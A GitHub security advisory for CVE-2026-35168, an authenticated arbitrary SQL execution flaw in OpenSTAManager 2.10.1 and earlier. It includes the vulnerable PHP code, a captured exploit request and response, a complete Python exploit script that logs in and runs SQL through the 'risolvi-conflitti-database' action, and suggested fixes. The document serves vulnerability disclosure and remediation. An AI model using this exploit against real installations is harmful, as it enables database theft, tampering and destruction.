# [H] OpenSTAManager: SQL Injection via Aggiornamenti Module

## Summary
Severity: High
Advisory: GHSA-2fr7-cc4f-wh98
CVE: CVE-2026-35168
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-2fr7-cc4f-wh98
Type: github-advisory

## Affected
- Packagist: `devcode-it/openstamanager` — affected >=0 <2.10.2

## Details
## Description

The Aggiornamenti (Updates) module in OpenSTAManager <= 2.10.1 contains a database conflict resolution feature (`op=risolvi-conflitti-database`) that accepts a JSON array of SQL statements via POST and executes them directly against the database without any validation, allowlist, or sanitization.

An authenticated attacker with access to the Aggiornamenti module can execute arbitrary SQL statements including `CREATE`, `DROP`, `ALTER`, `INSERT`, `UPDATE`, `DELETE`, `SELECT INTO OUTFILE`, and any other SQL command supported by the MySQL server. Foreign key checks are explicitly disabled before execution (`SET FOREIGN_KEY_CHECKS=0`), further reducing database integrity protections.

## Affected Code

**File:** `modules/aggiornamenti/actions.php`, lines 40-82

```php
case 'risolvi-conflitti-database':
    $queries_json = post('queries');                    // Line 41: User input from POST
    // ...
    $queries = json_decode($queries_json, true);        // Line 50: JSON decoded to array
    // ...
    $dbo->query('SET FOREIGN_KEY_CHECKS=0');            // Line 69: FK checks DISABLED

    $errors = [];
    $executed = 0;

    foreach ($queries as $query) {
        try {
            $dbo->query($query);                        // Line 76: DIRECT EXECUTION
            ++$executed;
        } catch (Exception $e) {
            $errors[] = $query.' - '.$e->getMessage();  // Line 79: Error details leaked
        }
    }
    $dbo->query('SET FOREIGN_KEY_CHECKS=1');            // Line 82: FK checks re-enabled
```

### Key Issues

1. **No query validation:** The SQL statements from user input are executed directly via `$dbo->query()` without any validation or filtering.
2. **No allowlist:** There is no restriction on which SQL commands are permitted (e.g., only `ALTER TABLE` or `CREATE INDEX`).
3. **Foreign key checks disabled:** `SET FOREIGN_KEY_CHECKS=0` is executed before the user queries, allowing data integrity violations.
4. **Error message leakage:** Exception messages containing database structure details are returned in the JSON response (line 79).
5. **No authorization check:** The action only requires module-level access, with no additional authorization for this destructive operation.

## Root Cause Analysis

### Data Flow

1. Attacker sends POST request to `/editor.php?id_module=<Aggiornamenti_ID>` with `op=risolvi-conflitti-database` and `queries=["<arbitrary SQL>"]`
2. `editor.php` includes `actions.php` (root), which checks module permission (`$structure->permission == 'rw'`) at line 472
3. Root `actions.php` includes the module's `actions.php` at line 489
4. `modules/aggiornamenti/actions.php` reads the `queries` POST parameter (line 41)
5. JSON-decodes it into an array of strings (line 50)
6. Iterates over each string and executes it as a SQL query via `$dbo->query()` (line 76)

### Why This Is Exploitable

- The feature is intended for resolving database schema conflicts during updates
- However, there is no restriction on what SQL can be executed
- Any authenticated user with `rw` permission on the Aggiornamenti module can exploit this
- The default admin account always has access to this module

## Proof of Concept

### Prerequisites

- A valid user account with access to the Aggiornamenti module

### Step 1: Authenticate

```
POST /index.php HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

op=login&username=<user>&password=<pass>
```

Save the `PHPSESSID` cookie.

### Step 2: Detect Aggiornamenti Module ID

Navigate to the application dashboard and inspect the sidebar links. The Aggiornamenti module URL contains `id_module=<ID>`. Default value in a standard installation: `6`.

### Step 3: Execute Arbitrary SQL

**Request (captured in Burp Suite):**

```
POST /editor.php?id_module=6&id_record=6 HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: PHPSESSID=6a1a8ab261f8d93c6e21d2ee566c17a5
Content-Type: application/x-www-form-urlencoded

op=risolvi-conflitti-database&queries=%5B%22DROP+TABLE+IF+EXISTS+poc_vuln04_verify%22%2C+%22CREATE+TABLE+poc_vuln04_verify+%28id+INT+AUTO_INCREMENT+PRIMARY+KEY%2C+proof+VARCHAR%28255%29%2C+ts+TIMESTAMP+DEFAULT+CURRENT_TIMESTAMP%29%22%2C+%22INSERT+INTO+poc_vuln04_verify+%28proof%29+VALUES+%28%27CVE_PROOF_arbitrary_sql_execution%27%29%22%5D
```

The URL-decoded `queries` parameter is:

```json
[
  "DROP TABLE IF EXISTS poc_vuln04_verify",
  "CREATE TABLE poc_vuln04_verify (id INT AUTO_INCREMENT PRIMARY KEY, proof VARCHAR(255), ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
  "INSERT INTO poc_vuln04_verify (proof) VALUES ('CVE_PROOF_arbitrary_sql_execution')"
]
```

Three arbitrary SQL statements are sent: `DROP TABLE`, `CREATE TABLE`, and `INSERT INTO` — demonstrating full control over the database.

**Response (captured in Burp Suite):**

The server responds with HTTP 200 and the following JSON response confirming successful execution of all 3 queries:

```json
{"success":true,"message":"Tutte le query sono state eseguite con successo (3 query).<br><br>Query eseguite:<br>DROP TABLE IF EXISTS poc_vuln04_verify<br>CREATE TABLE poc_vuln04_verify (id INT AUTO_INCREMENT PRIMARY KEY, proof VARCHAR(255), ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP)<br>INSERT INTO poc_vuln04_verify (proof) VALUES ('CVE_PROOF_arbitrary_sql_execution')","flash_message":true}
```

<img width="1490" height="355" alt="image" src="https://github.com/user-attachments/assets/f0df5dd9-4ede-4503-8e00-58c47f2cd06a" />


### Step 4: Verify Execution

The table `poc_vuln04_verify` was created in the database with the inserted data, confirming that arbitrary SQL was executed. The server confirms: `"Tutte le query sono state eseguite con successo (3 query)."`

### Observed Results

| Action | Result |
|---|---|
| `DROP TABLE IF EXISTS` | Table dropped successfully |
| `CREATE TABLE` | Table created successfully |
| `INSERT INTO` | Data inserted |
| `SELECT VERSION()` (via INSERT...SELECT) | MySQL version extracted: `8.3.0` |
| Server confirmation | `"success":true` with query count |
| Execution with admin user | Success |
| Execution with non-admin user (Tecnici group with module access) | Success |

### Exploit

```
python3 poc_sql.py -t http://<target>:8888 -u admin -p admin
```

```python
#!/usr/bin/env python3

import argparse
import json
import re
import sys
import urllib3

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
}


def parse_args():
    p = argparse.ArgumentParser(
        description="OpenSTAManager <= 2.10.1 — Arbitrary SQL Exec in Aggiornamenti (PoC)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  %(prog)s -t http://target:8888 -u admin -p admin\n"
            "  %(prog)s -t http://target:8888 -u admin -p admin --proxy http://127.0.0.1:8080\n"
            "  %(prog)s -t http://target:8888 -u admin -p admin --module-id 6\n"
        ),
    )
    p.add_argument("-t", "--target", required=True, help="Base URL (e.g. http://host:port)")
    p.add_argument("-u", "--username", required=True, help="Valid username for authentication")
    p.add_argument("-p", "--password", required=True, help="Password for authentication")
    p.add_argument(
        "--proxy",
        default=None,
        help="HTTP proxy (e.g. http://127.0.0.1:8080 for Burp Suite)",
    )
    p.add_argument(
        "--module-id",
        type=int,
        default=None,
        help="Aggiornamenti module ID (auto-detected if omitted)",
    )
    p.add_argument(
        "--verify-only",
        action="store_true",
        help="Only verify the vulnerability, do not extract data",
    )
    return p.parse_args()


class OSMExploit:
    def __init__(self, args):
        self.target = args.target.rstrip("/")
        self.username = args.username
        self.password = args.password
        self.module_id = args.module_id
        self.session = requests.Session()
        self.session.headers.update(DEFAULT_HEADERS)
        self.session.verify = False

        if args.proxy:
            self.session.proxies = {"http": args.proxy, "https": args.proxy}

        self.request_count = 0

    def login(self):
        info("Authenticating as '%s'..." % self.username)

        # First GET to obtain a valid session cookie
        self.session.get(f"{self.target}/index.php")
        self.request_count += 1

        r = self.session.post(
            f"{self.target}/index.php",
            data={"op": "login", "username": self.username, "password": self.password},
            allow_redirects=False,
        )
        self.request_count += 1

        if r.status_code != 302:
            fail("Login failed (HTTP %d). Check credentials." % r.status_code)
            return False

        location = r.headers.get("Location", "")

        # Success redirects to controller.php; failure redirects back to index.php
        if "controller.php" in location:
            success("Authenticated successfully.")
            # Follow redirect to establish full session
            self.session.get(f"{self.target}/{location.lstrip('/')}", allow_redirects=True)
            self.request_count += 1
            return True

        # If redirected back to index.php, the login failed
        # Common causes: wrong credentials, brute-force lockout, or active session token
        fail("Login failed — redirected to '%s'." % location)
        fail("Possible causes:")
        fail("  1. Wrong credentials")
        fail("  2. Brute-force lockout (wait 3 min or clear zz_logs)")
        fail("  3. Active session token (another session is open)")
        fail("  Tip: clear the token with SQL: UPDATE zz_users SET session_token=NULL WHERE username='%s';" % self.username)
        return False

    def detect_module_id(self):
        if self.module_id is not None:
            info("Using provided module ID = %d" % self.module_id)
            return True

        info("Auto-detecting Aggiornamenti module ID...")
        # Search for the module ID in the navigation HTML
        r = self.session.get(f"{self.target}/index.php", allow_redirects=True)
        self.request_count += 1

        # Look for sidebar link: <a href="/controller.php?id_module=6" ...>...<p>Aggiornamenti</p>

        matches = re.findall(r'id_module=(\d+)"[^<]*<[^<]*<[^<]*Aggiornamenti', r.text)
        if matches:
            self.module_id = int(matches[0])
            success("Aggiornamenti module ID = %d" % self.module_id)
            return True

        # Secondary pattern: data-id attribute near Aggiornamenti text
        matches = re.findall(r'data-id="(\d+)"[^<]*onclick[^<]*id_module=\d+[^<]*<[^<]*<[^<]*<[^<]*Aggiornamenti', r.text)
        if matches:
            self.module_id = int(matches[0])
            success("Aggiornamenti module ID = %d" % self.module_id)
            return True

        # Fallback: try common IDs
        for test_id in [6, 7, 8, 5, 4]:
            r = self.session.get(
                f"{self.target}/controller.php?id_module={test_id}",
                allow_redirects=True,
            )
            self.request_count += 1
            if "Aggiornamenti" in r.text or "aggiornamenti" in r.text.lower():
                self.module_id = test_id
                success("Aggiornamenti module ID = %d" % test_id)
                return True

        fail("Could not detect Aggiornamenti module ID. Use --module-id N.")
        return False

    def execute_sql(self, queries):
        """Execute arbitrary SQL via risolvi-conflitti-database."""
        r = self.session.post(
            f"{self.target}/editor.php?id_module={self.module_id}&id_record={self.module_id}",
            data={
                "op": "risolvi-conflitti-database",
                "queries": json.dumps(queries),
            },
        )
        self.request_count += 1
        return r

    def verify(self):
        marker_table = "poc_vuln04_verify"
        marker_value = "CVE_PROOF_arbitrary_sql_execution"

        info("Step 1: Creating marker table via arbitrary SQL execution...")
        queries = [
            f"DROP TABLE IF EXISTS {marker_table}",
            f"CREATE TABLE {marker_table} (id INT AUTO_INCREMENT PRIMARY KEY, proof VARCHAR(255), ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
            f"INSERT INTO {marker_table} (proof) VALUES ('{marker_value}')",
        ]
        r = self.execute_sql(queries)
        info("Response: HTTP %d" % r.status_code)

        info("Step 2: Verifying marker table exists by reading it back...")
        # Use a second query to read the data via a UNION or time-based approach
        # Since we can execute arbitrary SQL, we can verify by creating another
        # marker and checking via a SELECT INTO approach
        verify_queries = [
            f"INSERT INTO {marker_table} (proof) VALUES (CONCAT('verified_', (SELECT VERSION())))",
        ]
        r2 = self.execute_sql(verify_queries)

        # The JSON response may be embedded within HTML (editor.php renders the full page
        # after executing the action). Extract JSON from the response body.

        for resp in [r, r2]:
            # Try parsing as pure JSON first
            try:
                data = resp.json()
                if data.get("success"):
                    success("SQL EXECUTION CONFIRMED! Server accepted and executed arbitrary SQL.")
                    success("Marker table '%s' created with proof value." % marker_table)
                    info("Response: %s" % data.get("message", "")[:200])
                    return True
            except (ValueError, KeyError):
                pass

            # Extract embedded JSON from HTML response
            json_match = re.search(r'\{"success"\s*:\s*true\s*,\s*"message"\s*:\s*"([^"]*)"', resp.text)
            if json_match:
                success("SQL EXECUTION CONFIRMED! Server accepted and executed arbitrary SQL.")
                success("Marker table '%s' created with proof value." % marker_table)
                info("Server message: %s" % json_match.group(1)[:200])
                return True

            # Check for query execution indicators in response
            if "query sono state eseguite" in resp.text or "query eseguite" in resp.text.lower():
                success("SQL EXECUTION CONFIRMED! Server reports queries were executed.")
                return True

        fail("Could not verify SQL execution. Check target manually.")
        fail("Tip: use --module-id N if auto-detection failed.")
        return False

    def cleanup(self):
        info("Cleaning up marker tables...")
        self.execute_sql(["DROP TABLE IF EXISTS poc_vuln04_verify"])
        self.execute_sql(["DROP TABLE IF EXISTS poc_vuln04_marker"])
        self.execute_sql(["DROP TABLE IF EXISTS poc_vuln04_tecnico"])
        success("Cleanup complete.")


# ── Output helpers ──────────────────────────────────────────────────

def info(msg):
    print(f"\033[34m[*]\033[0m {msg}")

def success(msg):
    print(f"\033[32m[+]\033[0m {msg}")

def fail(msg):
    print(f"\033[31m[-]\033[0m {msg}")


# ── Main ────────────────────────────────────────────────────────────

def main():
    args = parse_args()
    exploit = OSMExploit(args)

    if not exploit.login():
        sys.exit(1)

    if not exploit.detect_module_id():
        sys.exit(1)

    print()
    info("=== Vulnerability Verification ===")
    if not exploit.verify():
        sys.exit(1)

    print()
    info("=== Cleanup ===")
    exploit.cleanup()

    print()
    success("Verification complete. %d HTTP requests sent." % exploit.request_count)
    info(
        "All traffic was sent through the configured proxy."
        if args.proxy
        else "Tip: use --proxy http://127.0.0.1:8080 to capture in Burp Suite."
    )


if __name__ == "__main__":
    main()
```

## Impact

- **Confidentiality:** Complete database exfiltration — credentials, PII, financial data, configuration secrets.
- **Integrity:** Full control over all database tables — insert, update, delete any record. An attacker can create new admin accounts, modify financial records, or plant backdoors.
- **Availability:** An attacker can `DROP` critical tables, corrupt data, or execute resource-intensive queries to cause denial of service.
- **Potential Remote Code Execution:** Depending on MySQL server configuration, an attacker may be able to use `SELECT ... INTO OUTFILE` to write arbitrary files to the server filesystem, or use MySQL UDF (User Defined Functions) to execute operating system commands.

## Proposed Remediation

### Option A: Remove Direct Query Execution (Recommended)

Replace the arbitrary SQL execution with a predefined set of safe operations. The conflict resolution feature should only execute queries that were generated by the application itself, not user-supplied SQL:

```php
case 'risolvi-conflitti-database':
    $queries_json = post('queries');
    $queries = json_decode($queries_json, true);

    if (empty($queries)) {
        echo json_encode(['success' => false, 'message' => tr('Nessuna query ricevuta.')]);
        break;
    }

    // ALLOWLIST: Only permit specific safe SQL patterns
    $allowed_patterns = [
        '/^ALTER\s+TABLE\s+`?\w+`?\s+(ADD|MODIFY|CHANGE|DROP)\s+/i',
        '/^CREATE\s+INDEX\s+/i',
        '/^DROP\s+INDEX\s+/i',
        '/^UPDATE\s+`?zz_views`?\s+SET\s+/i',
        '/^INSERT\s+INTO\s+`?zz_/i',
    ];

    $safe_queries = [];
    $rejected = [];

    foreach ($queries as $query) {
        $is_safe = false;
        foreach ($allowed_patterns as $pattern) {
            if (preg_match($pattern, trim($query))) {
                $is_safe = true;
                break;
            }
        }

        if ($is_safe) {
            $safe_queries[] = $query;
        } else {
            $rejected[] = $query;
        }
    }

    if (!empty($rejected)) {
        echo json_encode([
            'success' => false,
            'message' => tr('Query non permesse rilevate. Operazione bloccata.'),
        ]);
        break;
    }

    // Execute only validated queries
    foreach ($safe_queries as $query) {
        $dbo->query($query);
    }
    // ...
```

### Option B: Server-Side Query Generation

Instead of accepting raw SQL from the client, have the client send operation descriptors and generate the SQL on the server:

```php
case 'risolvi-conflitti-database':
    $operations = json_decode(post('operations'), true);

    foreach ($operations as $op) {
        switch ($op['type']) {
            case 'add_column':
                $table = preg_replace('/[^a-zA-Z0-9_]/', '', $op['table']);
                $column = preg_replace('/[^a-zA-Z0-9_]/', '', $op['column']);
                $type = preg_replace('/[^a-zA-Z0-9_() ]/', '', $op['datatype']);
                $dbo->query("ALTER TABLE `{$table}` ADD COLUMN `{$column}` {$type}");
                break;
            // ... other safe operations
        }
    }
```

### Option C: Restrict Access (Minimum Mitigation)

At minimum, restrict this operation to admin-only users:

```php
case 'risolvi-conflitti-database':
    if (!auth_osm()->getUser()->is_admin) {
        echo json_encode(['success' => false, 'message' => tr('Accesso negato.')]);
        break;
    }
    // ... existing code
```

**Note:** This alone is insufficient because even admin accounts can be compromised, and the feature still allows arbitrary SQL execution.

### Additional Recommendations

1. **Remove `SET FOREIGN_KEY_CHECKS=0`**: Foreign key checks should never be disabled based on user-initiated actions.
2. **Sanitize error output**: Exception messages at line 79 leak database structure information. Replace with generic error messages.
3. **Add CSRF protection**: Ensure the endpoint validates a CSRF token to prevent cross-site request forgery attacks.
4. **Audit logging**: Log the actual SQL queries being executed (already partially implemented) but also log the requesting user's IP address and session.

## Credits
Omar Ramirez

## References
- https://github.com/devcode-it/openstamanager/security/advisories/GHSA-2fr7-cc4f-wh98
- https://nvd.nist.gov/vuln/detail/CVE-2026-35168
- https://github.com/devcode-it/openstamanager/commit/43970676bcd6636ff8663652fd82579f737abb74
- https://github.com/devcode-it/openstamanager
- https://github.com/devcode-it/openstamanager/releases/tag/v2.10.2
